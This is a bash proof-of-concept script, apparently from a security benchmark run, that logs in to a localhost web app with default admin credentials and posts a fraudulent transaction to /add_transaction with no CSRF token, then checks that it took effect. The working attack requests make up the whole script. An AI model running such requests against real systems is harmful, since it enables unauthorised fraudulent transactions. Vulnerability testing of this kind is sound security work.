#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /add_transaction endpoint by submitting an unauthorized transaction request
# Target: ./repo
# Created: 2025-12-01T16:00:22.562Z
# Session: benchmark-XBEN-093-24-minbvw4l

# CSRF Attack POC on /add_transaction endpoint
# This script demonstrates how an attacker can add unauthorized transactions
# by exploiting the missing CSRF token protection

TARGET_URL="http://localhost:5003"
COOKIES_FILE="/tmp/csrf_test_cookies.txt"

echo "[*] CSRF Attack POC on /add_transaction endpoint"
echo "[*] Target: $TARGET_URL/add_transaction"
echo ""

# Step 1: First, authenticate to get a valid session
echo "[*] Step 1: Authenticating to create a valid session..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$LOGIN_RESPONSE" | grep -q "302\|Redirect\|Location" || [ -f "$COOKIES_FILE" ]; then
    echo "[+] Authentication successful, session created"
else
    echo "[-] Authentication may have failed, but continuing with POC..."
fi

echo ""

# Step 2: Attempt to add a transaction without a CSRF token
echo "[*] Step 2: Attempting to add transaction without CSRF token..."
echo "[*] Sending POST request with transaction data..."

CSRF_ATTACK_RESPONSE=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/add_transaction" \
  -d "name=CSRF%20Attack&email=csrf@attacker.com&amount=999" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -i)

echo "[*] Response received:"
echo "$CSRF_ATTACK_RESPONSE"
echo ""

# Step 3: Check if the transaction was added
if echo "$CSRF_ATTACK_RESPONSE" | grep -q "302\|Location: /transactions"; then
    echo "[+] VULNERABILITY CONFIRMED: Transaction was added without CSRF token!"
    echo "[+] Server responded with 302 redirect to /transactions"
    echo "[+] This indicates the POST request was processed successfully"
    
    # Verify by checking if we can see the transaction
    echo ""
    echo "[*] Step 3: Verifying transaction was created..."
    TRANSACTIONS=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/transactions")
    
    if echo "$TRANSACTIONS" | grep -q "CSRF Attack\|csrf@attacker.com"; then
        echo "[+] CONFIRMED: Fraudulent transaction is visible in transaction list"
        echo "[+] CSRF vulnerability successfully demonstrated"
        exit 0
    else
        echo "[*] Transaction list check inconclusive, but POST was accepted"
        exit 0
    fi
else
    echo "[-] Unexpected response - vulnerability may not be present or endpoint behaves differently"
    exit 1
fi